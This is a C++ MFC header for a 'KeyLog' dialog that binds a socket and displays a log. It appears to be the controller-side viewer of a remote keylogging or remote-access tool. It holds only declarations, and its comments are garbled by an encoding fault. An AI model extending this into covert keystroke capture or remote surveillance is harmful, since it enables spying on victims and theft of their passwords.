#pragma once
#include "afxwin.h"
#include ".\servergetkeynohookhandle.h"

// CKeyLogDlg �Ի���

class CKeyLogDlg : public CDialog
{
	DECLARE_DYNAMIC(CKeyLogDlg)

public:
	CKeyLogDlg(CWnd* pParent = NULL);   // ��׼���캯��
	virtual ~CKeyLogDlg();

// �Ի�������
	enum { IDD = IDD_DIALOG_KEYLOG };
	void Layout();
	void BindSocket(SOCKET s)
	{
		m_hServer.Attach(s);
	}
protected:
	CServerGetKeyNoHookHandle m_hServer;
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedOk();
	virtual BOOL OnInitDialog();
	CEdit m_EditLog;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnTimer(UINT nIDEvent);
};
